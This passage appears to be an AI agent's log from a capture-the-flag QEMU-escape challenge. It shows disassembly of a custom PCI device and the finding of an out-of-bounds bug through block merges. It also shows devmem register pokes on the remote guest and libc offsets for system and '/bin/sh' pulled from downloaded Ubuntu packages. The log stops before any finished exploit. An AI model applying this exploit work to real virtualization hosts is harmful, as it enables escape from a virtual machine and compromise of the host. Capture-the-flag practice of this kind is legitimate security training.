@@ -2561,3 +2561,415 @@ Terminal features will not be available.  Consider setting TERM variable to your
 
 
 ── step 147 · 23:37:10 (+1065.4s) ──────────────────────────────
+💭 思考: QEMU is PIE. So we need a leak of the QEMU base and libc base. Hmm.
+
+Now: how to leak? We need an OOB read. Let me reconsider.
+
+Actually! Big realization: the gift sets dev->[0xe98] = printf (libc pointer) and dev->[0xea0] = binary pointer. These are stored in the device struct. 
+💬 说: QEMU 是 PIE，需泄露。先 dump execute_command 跳转表 & 检索 block+0x8 的写入点（decrypt 的长度字段）。
+🔧 bash: {"command": "python3 vaddr.py cd6984 20"}
+📥 [ok] section .rodata
+00cd6984: e1 14 7c ff b9 0e 7c ff 10 0f 7c ff dd 0f 7c ff  ..|...|...|...|.
+00cd6994: 82 10 7c ff e1 14 7c ff bd 14 7c ff 56 69 72 74  ..|...|...|.Virt
+as u32: ['0xff7c14e1', '0xff7c0eb9', '0xff7c0f10', '0xff7c0fdd', '0xff7c1082', '0xff7c14e1', '0xff7c14bd', '0x74726956']
+
+🔧 bash: {"command": "python3 vaddr.py 1c7e240 8"}
+📥 [ok] section .data
+01c7e240: 01 00 00 00 00 00 00 00  ........
+as u32: ['0x1', '0x0']
+
+🔧 bash: {"command": "grep -n \"0x8(%r\" virtsec_all.asm"}
+📥 [ok] 18:  496d15:	mov    %rdi,-0x8(%rbp)
+19:  496d19:	mov    -0x8(%rbp),%rax
+50:  496d6d:	mov    %rdi,-0x8(%rbp)
+51:  496d71:	mov    -0x8(%rbp),%rax
+116:  496e31:	mov    %rax,-0x8(%rbp)
+178:  496f27:	lea    0x8(%rax),%rcx
+349:  4971dc:	mov    -0x8(%rbp),%rdx
+400:  49729c:	mov    %rax,-0x8(%rbp)
+401:  4972a0:	cmpq   $0x0,-0x8(%rbp)
+403:  4972ab:	mov    -0x8(%rbp),
+
+── step 148 · 23:37:25 (+1080.3s) ──────────────────────────────
+💭 思考: gift_flag = 1 initially (in .data at 1c7e240). So the gift triggers on the first write to reg 0x38: sets ptr_e98=printf, ptr_ea0=str, calls printf(str). So we get the libc printf pointer placed at dev+0xe98.
+
+Now, blk->[8] is only set to 0 in allocate (498109). And swap_blocks co
+💬 说: 关键突破：**块大小可通过反复 merge（cmd4）无限增长**，从而让块读/写路径越界，读到设备的 `ptr_e98`（gift 写入的 printf 地址 → libc 泄露）和 `ptr_ea0`（PIE 泄露）。先验证 guest 内 MMIO 访问方式。
+🔧 write_file: {"path": "guest_test1.py", "content": "#!/usr/bin/env python3\nfrom pwn import *\nimport time\ncontext.log_level='info'\nHOST=\"oj-10-30-15-1-46347.adworld.xctf.org.cn\"; PORT=9999\nio=remote(HOST,PORT,ssl=True)\nio.recv
+📥 [ok] OK: wrote 1476 bytes to var/jobs/7a921ace/ws/guest_test1.py
+
+── step 149 · 23:38:36 (+1151.0s) ──────────────────────────────
+🔧 bash: {"command": "python3 guest_test1.py"}
+📥 [ok] [x] Opening connection to oj-10-30-15-1-46347.adworld.xctf.org.cn on port 9999
+[x] Opening connection to oj-10-30-15-1-46347.adworld.xctf.org.cn on port 9999: Trying 61.147.171.103
+[+] Opening connection to oj-10-30-15-1-46347.adworld.xctf.org.cn on port 9999: Done
+[+] shell
+###  b'ls /sys/bus/pci/devices/0000:00:04.0/'
+ls /sys/bus/pci/devices/0000:00:04.0/
+
+[progress] 已用 150 步 / 已过 1180s / 最近工具有新信息
+
+── step 150 · 23:39:05 (+1180.3s) ──────────────────────────────
+💭 思考: The read of resource0 via dd gave nothing printed (my parsing: the od output maybe got mixed). Also the writes seem to have gone through (the gift didn't print "hello" — maybe because no output captured, or because the write didn't work, or because reading/writing the resource fi
+💬 说: busybox 有 `devmem`。用它对 BAR 物理地址 `0xfebf0000` 直接读写。重写交互测试。
+🔧 write_file: {"path": "guest_test2.py", "content": "#!/usr/bin/env python3\nfrom pwn import *\nimport time\ncontext.log_level='warning'\nHOST=\"oj-10-30-15-1-46347.adworld.xctf.org.cn\"; PORT=9999\nio=remote(HOST,PORT,ssl=True)\nio.r
+📥 [ok] OK: wrote 953 bytes to var/jobs/7a921ace/ws/guest_test2.py
+
+── step 151 · 23:39:12 (+1187.0s) ──────────────────────────────
+🔧 bash: {"command": "python3 guest_test2.py"}
+📥 [ok] [+] shell
+$ devmem 0xfebf0000 32
+devmem 0xfebf0000 32
+0x524F4953
+/ # echo @@DONE@@
+$ devmem 0xfebf0004 32
+
+@@DONE@@
+$ devmem 0xfebf0008 32
+
+/ # devmem 0xfebf0004 32
+0x00000100
+/ # echo @@DONE@@
+$ devmem 0xfebf000c 32
+
+@@DONE@@
+$ devmem 0xfebf0038 32 1
+
+/ # devmem 0xfebf0008 32
+0x00000000
+/ # echo @@DONE@@
+POST-GIFT: b'\r\n'
+
+Warning: _curses.error: setupterm
+
+── step 152 · 23:39:36 (+1210.7s) ──────────────────────────────
+💭 思考: devmem works. Signature = 0x524F4953. offset 4 = 0x100. offset 8 (status bd0) = 0.
+
+Now the gift: we wrote 0xfebf0038 = 1. But we didn't see "hello". Hmm. The handler does puts("hello") → should print to console. Also printf(welcome). But we got nothing.
+
+Wait — maybe the write d
+💬 说: devmem 读有效（sig=0x524F4953）。验证写是否生效：写控制寄存器后读回。
+🔧 write_file: {"path": "guest_test3.py", "content": "#!/usr/bin/env python3\nfrom pwn import *\nimport time\ncontext.log_level='warning'\nHOST=\"oj-10-30-15-1-46347.adworld.xctf.org.cn\"; PORT=9999\nio=remote(HOST,PORT,ssl=True)\nio.r
+📥 [ok] OK: wrote 1064 bytes to var/jobs/7a921ace/ws/guest_test3.py
+
+── step 153 · 23:39:43 (+1217.6s) ──────────────────────────────
+🔧 bash: {"command": "python3 guest_test3.py"}
+📥 [ok] == write 0x30=0xdeadbeef, read 0x1c (should be 0xdeadbeef) ==
+$ devmem 0xfebf0030 32 0xdeadbeef
+devmem 0xfebf0030 32 0xdeadbeef
+/ # echo @@DONE@@
+$ devmem 0xfebf001c 32
+
+@@DONE@@
+== write cmd=1 via 0x0c, read status 0x08 (should be 1) ==
+$ devmem 0xfebf000c 32 1
+
+/ # devmem 0xfebf001c 32
+0x00000000
+/ # echo @@DONE@@
+$ devmem 0xfebf0008 32
+
+@@DONE@@
+== read 0
+
+── step 154 · 23:40:06 (+1241.3s) ──────────────────────────────
+💭 思考: Writes via devmem don't seem to take effect: writing 0x30=0xdeadbeef then reading 0x1c gave 0x00000000. And writing cmd=1 then read 0x08 gave... it got interleaved; the read of 0x08 returned nothing visible (marker timing). Let me look: after writing 0x0c=1, read 0x1c still 0. Hm
+💬 说: devmem 写似乎未生效（可能 /dev/mem 只读）。改用 resource0，并检查能否编译静态 helper 上传。
+🔧 write_file: {"path": "check_tools.py", "content": "#!/usr/bin/env python3\nimport subprocess,shutil,os\nfor t in ['gcc','musl-gcc','cc','ld','as']:\n    print(t, shutil.which(t))\n# look for static libc\nfor p in ['/usr/lib/x86_64-l
+📥 [ok] OK: wrote 321 bytes to var/jobs/7a921ace/ws/check_tools.py
+🔧 write_file: {"path": "guest_test4.py", "content": "#!/usr/bin/env python3\nfrom pwn import *\nimport time\ncontext.log_level='warning'\nHOST=\"oj-10-30-15-1-46347.adworld.xctf.org.cn\"; PORT=9999\nio=remote(HOST,PORT,ssl=True)\nio.r
+📥 [ok] OK: wrote 958 bytes to var/jobs/7a921ace/ws/guest_test4.py
+
+── step 155 · 23:40:16 (+1250.9s) ──────────────────────────────
+🔧 bash: {"command": "python3 check_tools.py"}
+📥 [ok] gcc /usr/bin/gcc
+musl-gcc None
+cc /usr/bin/cc
+ld /usr/bin/ld
+as /usr/bin/as
+/usr/lib/x86_64-linux-gnu/libc.a True
+/usr/lib/libc.a False
+b'gcc (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0\nCopyright (C) 2023 Free Software Foundation, Inc.\nThis is free software; see the source for copying conditions.  There is NO\nwarranty; not even for MERCHANTAB'
+
+🔧 bash: {"command": "python3 guest_test4.py"}
+📥 [ok] $ dd if=/sys/bus/pci/devices/0000:00:04.0/resource0 bs=4 count=1 2>&1 | hexdump -C
+dd if=/sys/bus/pci/devices/0000:00:04.0/resource0 bs=4 count=1 2>&1 | hexdum
+
+p -C
+00000000  64 64 3a 20 2f 73 79 73  2f 62 75 73 2f 70 63 69  |dd: /sys/bus/pci|
+00000010  2f 64 65 76 69 63 65 73  2f 30 30 30 30 3a 30 30  |/devices/0000:00|
+00000020  3a 30 34 2e 30 2f 72 65  7
+
+── step 156 · 23:40:41 (+1276.3s) ──────────────────────────────
+💭 思考: resource0 read via dd gives "Input/output error". So resource0 doesn't support read/write (only mmap). So we need mmap.
+
+We have gcc on Kali (Ubuntu 24.04, gcc 13) and static libc. We can compile a statically-linked x86-64 helper and upload it via base64.
+
+The helper will:
+- open
+💬 说: resource0 不支持 dd（仅 mmap）；devmem 读有效。先编译一个静态 mmap helper 上传，同时做一次干净的 devmem 写回读测试。
+🔧 write_file: {"path": "helper.c", "content": "#include <stdio.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <sys/mman.h>\n#include <string.h>\n#include <unistd.h>\n\nint main(){\n  int fd=open(\"/sys/bus/pci/devices/0000:00:0
+📥 [ok] OK: wrote 1224 bytes to var/jobs/7a921ace/ws/helper.c
+🔧 write_file: {"path": "guest_test5.py", "content": "#!/usr/bin/env python3\nfrom pwn import *\nimport time\ncontext.log_level='warning'\nHOST=\"oj-10-30-15-1-46347.adworld.xctf.org.cn\"; PORT=9999\nio=remote(HOST,PORT,ssl=True)\nio.r
+📥 [ok] OK: wrote 584 bytes to var/jobs/7a921ace/ws/guest_test5.py
+[engine] compact #3: 删 50 条
+🗜 压缩 #2: 删 50 条
+
+── step 157 · 23:41:07 (+1301.5s) ──────────────────────────────
+🔧 bash: {"command": "gcc -O2 -static -o mmio helper.c"}
+⚠️  [error] Error: 'gcc' 不在白名单。可用命令：['ROPgadget', 'awk', 'base64', 'binwalk', 'cat', 'checksec', 'curl', 'cyclic', 'diff', 'echo', 'exiftool', 'file', 'find', 'gdb', 'grep', 'head', 'hexdump', 'intel', 'ls', 'mkdir', 'nc', 'nm', 'nmap', 'objdump', 'od', 'openssl', 'patchelf', 'pwd', 'python3', 'radare2', 'readelf', 'report_finding', 'sed', 'sha256sum', 'sort', 'sqlite3'
+🔧 bash: {"command": "python3 guest_test5.py"}
+📥 [ok] $ devmem 0xfebf0008 32
+devmem 0xfebf0008 32
+0x00000000
+/ # 
+$ devmem 0xfebf000c 32 1
+devmem 0xfebf000c 32 1
+/ # 
+$ devmem 0xfebf0008 32
+devmem 0xfebf0008 32
+0x00000001
+/ # 
+$ devmem 0xfebf000c 32
+devmem 0xfebf000c 32
+0x00000000
+/ # 
+
+Warning: _curses.error: setupterm: could not find terminfo database
+
+Terminal features will not be available.  Consider settin
+
+── step 158 · 23:41:30 (+1325.3s) ──────────────────────────────
+💭 思考: devmem writes DO work! cmd 1 → status 0x08 = 1. 
+
+So the earlier gift test: writing reg 0x38 with value should trigger puts("hello") and printf(...). But we didn't see it. Hmm. Maybe the outputs go to QEMU's stdout but the guest console... Let me reconsider: the handler at 4974b7
+💬 说: devmem 写生效（cmd 1 → status=1）。现在核对 0x38 的写分发与 gift 处理逻辑。
+🔧 bash: {"command": "python3 vaddr.py cd665c c0"}
+📥 [ok] section .rodata
+00cd665c: c4 0d 7c ff c4 0e 7c ff c4 0e 7c ff c4 0e 7c ff  ..|...|...|...|.
+00cd666c: dd 0d 7c ff c4 0e 7c ff c4 0e 7c ff c4 0e 7c ff  ..|...|...|...|.
+00cd667c: f2 0d 7c ff c4 0e 7c ff c4 0e 7c ff c4 0e 7c ff  ..|...|...|...|.
+00cd668c: 07 0e 7c ff c4 0e 7c ff c4 0e 7c ff c4 0e 7c ff  ..|...|...|...|.
+00cd669c: 1c 0e 7c ff c4 0e 7c ff c4 0e 
+
+── step 159 · 23:41:37 (+1332.0s) ──────────────────────────────
+[progress] 已用 160 步 / 已过 1343s / 最近工具无新信息
+💭 思考: Write table at cd665c, index = (addr-0xc)*4.
+- addr 0xc → index 0 → 0xff7c0dc4 → cd665c-0x83f23c = 497420 (cmd write).
+- addr 0x10 → index 4 → 0xff7c0ec4 → cd665c-0x83f13c = 497520 (dev->[0xbd4])? Let me compute: 0xff7c0ec4 = -0x83f13c; 0xcd665c-0x83f13c = 0x497520.
+- addr 0x14 →
+🔧 bash: {"command": "python3 p.py dis_mmio_write.txt 6 130"}
+📥 [ok]    6 0000000000497200 <virtsec_mmio_write>:
+   7   497200:	f3 0f 1e fa          	endbr64
+   8   497204:	55                   	push   rbp
+   9   497205:	48 89 e5             	mov    rbp,rsp
+  10   497208:	48 83 ec 50          	sub    rsp,0x50
+  11   49720c:	48 89 7d c8          	mov    QWORD PTR [rbp-0x38],rdi
+  12   497210:	48 89 75 c0          	mov    QWORD
+
+── step 160 · 23:41:48 (+1343.3s) ──────────────────────────────
+💭 思考: Now the data write path:
+- off = addr - 0x1000 (addr in [0x1000,0x1fff]).
+- find block by dev->[0xd8c], check enabled.
+- `if (off+4 > blk->[4]) return;` (line 53-58)
+- X = off + blk->[0xc] (line 59-63) [rbp-0x20]
+- if (off+4 <= 0x10) → single u32 write at dev+0xd90+X+8 = dev+0xd9
+💬 说: read 分发索引是 addr*4（不是 addr-0xc）。我漏读了 4970a7–497108 几个读处理函数，可能含关键寄存器。
+🔧 bash: {"command": "python3 p.py dis_read.txt 277 302"}
+📥 [ok]  277   4970a2:	e9 00 01 00 00       	jmp    4971a7 <virtsec_mmio_read+0x396>
+ 278   4970a7:	48 c7 45 e0 00 00 00 	movq   $0x0,-0x20(%rbp)
+ 279   4970ae:	00 
+ 280   4970af:	e9 f3 00 00 00       	jmp    4971a7 <virtsec_mmio_read+0x396>
+ 281   4970b4:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
+ 282   4970b8:	8b 80 d4 0b 00 00    	mov    0xbd4(%rax),%eax
+ 283
+
+── step 161 · 23:43:21 (+1436.0s) ──────────────────────────────
+💭 思考: Read handlers:
+- addr 0x0 → 497078: returns 0x524F4953 (sig)
+- addr 0x4 → 497085: returns 0x100
+- addr 0x8 → 497092: dev->[0xbd0]
+- addr 0xc → 4970a7: returns 0
+- addr 0x10 → 4970b4: dev->[0xbd4]
+- addr 0x14 → 4970c9: dev->[0xd8c]  (current id)
+- addr 0x18 → 4970de: dev->[0xbfc] 
+💬 说: 核心漏洞已定位：merge(cmd4) 的 memcpy 目标 `X_data+X_size` 可越界写 ptr_e98/ptr_ea0；用 swap 把大块移到 slot15 可越界**读**。先看 QEMU 是否导入 system/"bin/sh"。
+🔧 bash: {"command": "bash -lc \"nm -D chal/qemu-system-x86_64 2>/dev/null | grep -iE ' system|popen|execv|execl|/bin/sh' | head -40\""}
+⚠️  [error] Error: 'bash' 不在白名单。可用命令：['ROPgadget', 'awk', 'base64', 'binwalk', 'cat', 'checksec', 'curl', 'cyclic', 'diff', 'echo', 'exiftool', 'file', 'find', 'gdb', 'grep', 'head', 'hexdump', 'intel', 'ls', 'mkdir', 'nc', 'nm', 'nmap', 'objdump', 'od', 'openssl', 'patchelf', 'pwd', 'python3', 'radare2', 'readelf', 'report_finding', 'sed', 'sha256sum', 'sort', 'sqlite3
+
+── step 162 · 23:44:45 (+1520.2s) ──────────────────────────────
+🔧 bash: {"command": "nm -D chal/qemu-system-x86_64"}
+📥 [ok]                  U abort@GLIBC_2.2.5
+                 U accept@GLIBC_2.2.5
+                 U accept4@GLIBC_2.10
+                 U access@GLIBC_2.2.5
+                 U __assert_fail@GLIBC_2.2.5
+                 U atoi@GLIBC_2.2.5
+                 U bind@GLIBC_2.2.5
+                 U bsearch@GLIBC_2.2.5
+                 U calloc@GLIBC_2.2.5
+               
+
+── step 163 · 23:44:47 (+1522.0s) ──────────────────────────────
+💭 思考: QEMU imports `execv@GLIBC_2.2.5` but not `system`. It has `execv`, `fork`, etc.
+
+Hmm. execv(path, argv) needs 2 args; our call gives only rdi (path). rsi would be garbage. Hmm.
+
+libc `system` — not imported, but we can call it if we know libc base. We need printf offset for 2.35 
+💬 说: QEMU 导入 `execv`（无 system）。需要精确 libc 偏移，先测网络能否下载 Ubuntu 22.04 libc6 2.35。
+🔧 bash: {"command": "curl -s -m 15 -o /dev/null -w \"code=%{http_code}\\n\" http://archive.ubuntu.com/ubuntu/"}
+📥 [ok] OCI runtime exec failed: exec failed: unable to start container process: exec: "curl": executable file not found in $PATH: unknown
+
+🔧 bash: {"command": "strings -a chal/qemu-system-x86_64 | grep -n \"/bin/sh\" "}
+⚠️  [error] Error: 命令含未引用的 shell 元字符（| ; & > < $ ` * 等），但当前不允许 shell 解释。引号内的元字符是参数内容、可以直接用；确需管道/循环时，用 write_file 写脚本到工作目录，再 bash 执行该脚本文件。
+
+── step 164 · 23:44:58 (+1532.6s) ──────────────────────────────
+💭 思考: curl not found? Odd — the whitelist includes curl but the binary isn't in PATH of the container. Hmm. Let me use python3 urllib for network instead.
+
+Also the strings|grep failed due to pipe. Let me write a python script.
+
+Let me write a script that:
+1. searches qemu binary for "
+🔧 write_file: {"path": "find_str.py", "content": "#!/usr/bin/env python3\ndata=open('chal/qemu-system-x86_64','rb').read()\nfor pat in [b'/bin/sh', b'sh\\x00', b'bash\\x00', b'/bin/bash', b'cat \\x00', b'/flag', b'flag\\x00']:\n    id
+📥 [ok] OK: wrote 556 bytes to var/jobs/7a921ace/ws/find_str.py
+🔧 write_file: {"path": "net_test.py", "content": "#!/usr/bin/env python3\nimport urllib.request,sys\nurls=[\n \"http://archive.ubuntu.com/ubuntu/dists/jammy/main/\",\n \"http://security.ubuntu.com/ubuntu/dists/jammy-security/main/\",\
+📥 [ok] OK: wrote 368 bytes to var/jobs/7a921ace/ws/net_test.py
+
+── step 165 · 23:45:01 (+1535.8s) ──────────────────────────────
+🔧 bash: {"command": "python3 find_str.py"}
+📥 [ok] b'/bin/sh' 0xd98f3f 0
+b'/bin/sh' 0xda5d1f 1
+b'/bin/sh' 0xe502c2 2
+b'sh\x00' 0x7516 0
+b'sh\x00' 0x77b5 1
+b'sh\x00' 0x8267 2
+b'sh\x00' 0x865d 3
+b'sh\x00' 0x8d0c 4
+b'sh\x00' 0x8f68 5
+b'sh\x00' 0x93d3 6
+b'/flag' 0xe0abcb 0
+b'/flag' 0xe0b402 1
+b'/flag' 0xe0b51b 2
+b'/flag' 0xe0b8aa 3
+b'/flag' 0xe0ba20 4
+b'/flag' 0xe0c351 5
+b'flag\x00' 0xcbfb3b 0
+b'flag\x00' 0xd5df
+🔧 bash: {"command": "python3 net_test.py"}
+📥 [ok] OK http://archive.ubuntu.com/ubuntu/dists/jammy/main/ 200 200
+OK http://security.ubuntu.com/ubuntu/dists/jammy-security/main/ 200 200
+
+★ 发现 [asset]: http://archive.ubuntu.com/ubuntu/dists/jammy/main/
+★ 发现 [asset]: http://security.ubuntu.com/ubuntu/dists/jammy-security/main/
+
+── step 166 · 23:45:06 (+1540.9s) ──────────────────────────────
+💭 思考: Network works, and the QEMU binary has "/bin/sh" at file offset 0xd98f3f (virtual address = file off +? For a PIE, file offset ≈ vaddr - 0x... Since the earlier rodata strings at 0xcd6608 file offset = vaddr? The dump said section .rodata cd6608 and file offset 0xcd6608 → so file
+💬 说: 网络可用。下载 Ubuntu 22.04 (jammy) libc6 2.35 以取精确偏移。
+🔧 write_file: {"path": "get_libc.py", "content": "#!/usr/bin/env python3\nimport urllib.request, re, os, lzma, io, tarfile, struct\n\nbase=\"http://security.ubuntu.com/ubuntu/pool/main/g/glibc/\"\ntry:\n    html=urllib.request.urlopen
+📥 [ok] OK: wrote 634 bytes to var/jobs/7a921ace/ws/get_libc.py
+
+── step 167 · 23:45:15 (+1549.7s) ──────────────────────────────
+🔧 bash: {"command": "python3 get_libc.py"}
+📥 [ok] candidates: ['libc6_2.35-0ubuntu3.15_amd64.deb', 'libc6_2.35-0ubuntu3_amd64.deb']
+downloading http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.35-0ubuntu3_amd64.deb
+deb size 3235142 libc6_2.35-0ubuntu3_amd64.deb
+
+★ 发现 [asset]: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.35-0ubuntu3_amd64.deb
+
+── step 168 · 23:45:22 (+1557.1s) ──────────────────────────────
+💭 思考: Downloaded libc6_2.35-0ubuntu3_amd64.deb. But the target might be 2.35-0ubuntu3.15 (latest). Offsets are likely identical. Let me extract libc.so.6 and get offsets. Let me also download 3.15 to compare.
+
+Let me parse the deb (ar archive). Python's `ar` via tarfile? No. Let me par
+🔧 write_file: {"path": "extract_libc.py", "content": "#!/usr/bin/env python3\nimport io, tarfile, lzma, os, sys\n\ndef ar_members(path):\n    d=open(path,'rb').read()\n    assert d[:8]==b'!<arch>\\n'\n    off=8; members={}\n    while 
+📥 [ok] OK: wrote 1098 bytes to var/jobs/7a921ace/ws/extract_libc.py
+
+── step 169 · 23:45:26 (+1560.6s) ──────────────────────────────
+🔧 bash: {"command": "python3 extract_libc.py"}
+📥 [ok] members: ['debian-binary', 'control.tar.zst', 'data.tar.zst']
+data keys sizes: {'debian-binary': 4, 'control.tar.zst': 61290, 'data.tar.zst': 3173660}
+lzma fail Input format not supported by decoder
+
+[progress] 已用 170 步 / 已过 1562s / 最近工具无新信息
+
+── step 170 · 23:45:27 (+1562.4s) ──────────────────────────────
+💭 思考: data.tar.zst. Need zstd decompression. Python 3.14 has `compression.zstd`? Python 3.13 doesn't. Let me check if `zstandard` module is installed, or if `zstd`/`unzstd` binary exists. Let me try.
+
+Alternatively, download the libc6 .deb as "libc6-dbg"? no.
+
+Alternatively, use the ol
+🔧 write_file: {"path": "check_zstd.py", "content": "#!/usr/bin/env python3\nimport shutil, subprocess\nprint(\"zstd\", shutil.which('zstd'))\nprint(\"unzstd\", shutil.which('unzstd'))\nprint(\"dpkg-deb\", shutil.which('dpkg-deb'))\nfo
+📥 [ok] OK: wrote 451 bytes to var/jobs/7a921ace/ws/check_zstd.py
+
+── step 171 · 23:45:31 (+1565.7s) ──────────────────────────────
+🔧 bash: {"command": "python3 check_zstd.py"}
+📥 [ok] zstd None
+unzstd None
+dpkg-deb /usr/bin/dpkg-deb
+mod ok zstandard
+mod fail zstd No module named 'zstd'
+compression.zstd fail No module named 'compression'
+
+
+── step 172 · 23:45:33 (+1567.7s) ──────────────────────────────
+💭 思考: `zstandard` module is available. Let me decompress data.tar.zst with it.
+
+Let me rewrite extract to use zstandard.
+🔧 write_file: {"path": "extract_libc2.py", "content": "#!/usr/bin/env python3\nimport io, tarfile, zstandard, sys\n\ndef ar_members(path):\n    d=open(path,'rb').read()\n    off=8; members={}\n    while off+60<=len(d):\n        hdr=d[
+📥 [ok] OK: wrote 766 bytes to var/jobs/7a921ace/ws/extract_libc2.py
+
+── step 173 · 23:45:35 (+1570.1s) ──────────────────────────────
+🔧 bash: {"command": "python3 extract_libc2.py"}
+📥 [ok] FOUND ./lib/x86_64-linux-gnu/libc.so.6 2216304
+saved
+
+
+── step 174 · 23:45:38 (+1572.5s) ──────────────────────────────
+💭 思考: Got libc.so.6 (2.35-0ubuntu3). Let me get offsets of system, printf, and "/bin/sh".
+
+Let me compute with python (parse ELF symbols). Use `nm -D`? nm is whitelisted. Let me use nm -D libc.so.6.
+
+Let me get system, printf, __libc_start_main, and find "/bin/sh" offset in the file.
+
+
+🔧 write_file: {"path": "get_offsets.py", "content": "#!/usr/bin/env python3\nimport subprocess\nout=subprocess.run(['nm','-D','libc.so.6'],capture_output=True).stdout.decode()\nsyms={}\nfor line in out.splitlines():\n    p=line.split(
+📥 [ok] OK: wrote 670 bytes to var/jobs/7a921ace/ws/get_offsets.py
+
+── step 175 · 23:45:41 (+1575.9s) ──────────────────────────────
+🔧 bash: {"command": "python3 get_offsets.py"}
+📥 [ok] system 0x50d60
+printf 0x60770
+__libc_start_main 0x29dc0
+puts 0x80ed0
+read 0x114980
+write 0x114a20
+execve 0xeb0f0
+__printf NA
+_IO_2_1_stdout_ 0x21a780
+binsh 0x1d8698
+b'GLIBC 2.35'
+
+
+── step 176 · 23:45:43 (+1577.6s) ──────────────────────────────
+💭 思考: Offsets for libc 2.35-0ubuntu3:
+- system = 0x50d60
+- printf = 0x60770
+- "/bin/sh" = 0x1d8698
+
+But the target might use 2.35-0ubuntu3.15. Let me check if 3.15 has the same offsets. Let me download 3.15 too and compare. It matters.
+
+Let me download libc6_2.35-0ubuntu3.15_amd64.deb 
+🔧 write_file: {"path": "get_libc2.py", "content": "#!/usr/bin/env python3\nimport urllib.request, io, tarfile, zstandard, subprocess, re, sys\n\nname=sys.argv[1]\nurl=\"http://security.ubuntu.com/ubuntu/pool/main/g/glibc/\"+name\nprin
+📥 [ok] OK: wrote 1283 bytes to var/jobs/7a921ace/ws/get_libc2.py
+
+── step 177 · 23:45:49 (+1583.6s) ──────────────────────────────
+🔧 bash: {"command": "python3 get_libc2.py libc6_2.35-0ubuntu3.15_amd64.deb"}
+📥 [ok] dl http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.35-0ubuntu3.15_amd64.deb
+saved 2220400
+system 0x50d70
+printf 0x606f0
+binsh 0x1d8678
+b'GLIBC 2.35-0ubuntu3.15) stable release version 2.35.'
+
+★ 发现 [asset]: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.35-0ubuntu3.15_amd64.deb
+
+── step 178 · 23:45:54 (+1588.9s) ──────────────────────────────
